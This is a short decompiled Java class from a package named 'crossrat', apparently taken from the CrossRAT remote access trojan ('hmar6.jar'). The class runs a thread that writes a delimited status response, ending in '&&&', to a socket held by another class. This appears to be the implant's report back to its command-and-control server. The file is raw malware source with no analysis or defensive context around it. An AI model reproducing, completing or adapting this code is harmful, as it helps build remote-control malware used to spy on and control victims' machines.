package crossrat;

import java.io.DataOutputStream;
import java.io.InterruptedIOException;

/* loaded from: hmar6.jar:crossrat/g.class */
final class g extends Thread {
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        try {
            new DataOutputStream(k.k.getOutputStream()).writeBytes(String.valueOf(k.g) + k.arg_delimit + k.status_response + k.arg_delimit + "&&&");
        } catch (InterruptedIOException unused) {
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            if (isInterrupted()) {
                return;
            }
            e.printStackTrace();
        }
    }
}
